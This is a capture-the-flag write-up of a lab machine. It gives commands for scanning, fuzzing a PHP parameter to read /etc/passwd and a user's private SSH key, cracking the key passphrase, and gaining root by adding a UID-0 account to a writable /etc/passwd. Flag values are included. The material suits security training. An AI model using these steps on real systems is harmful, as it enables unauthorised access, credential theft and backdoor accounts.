We begin to enumerate with nmap and scan for open ports.
```
nmap -sV -sC -T4 192.168.235.212
```
we find two open ports 80 and 22.
We then use dirbuster to begin enumeration and find the secret directory and evil.php.
we decide to fuzz the url to see if we can use command injection.
```
ffuf -u 'http://10.0.0.192/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/directory-list-2.3-small.txt -fs 0
http://10.0.0.192/secret/evil.php?command=/etc/passwd```
```
We find out that command injection is possible and start with the /etc/passwd file.

```
http://192.168.235.212/secret/evil.php?FUZZ=/etc/passwd
```
We find the file and find a user by the name of mowree so we see if we can then find their ssh key.
```
view-source:http://192.168.235.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```
We find the ssh key and use john to crack it

```
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=~/rockyou.txt
```
we find the passphrase which is unicorn and then log into mowree through ssh.
```
ssh -i id_rsa mowree@192.168.235.212
```
we find the first flag : 9d55adc63c0eb16e118f38337cbdb90d
next we check the permissions of the /etc/passwd file and find we have write permissions
so we add a new user by generating a hash on this website ```https://unix4lyfe.org/crypt/```.

```
vi /etc/passwd
batman:$1$6liRPhZl$rGbkf1QKSGzCQLebrQE0m0:0:0:root:/root:/bin/bash
```
we login in with: ```su batman``` and gain root access and find the root flag: 537c0cc59e5e360c5a02cd9440b16f0f

system has been rooted action is no longer required.
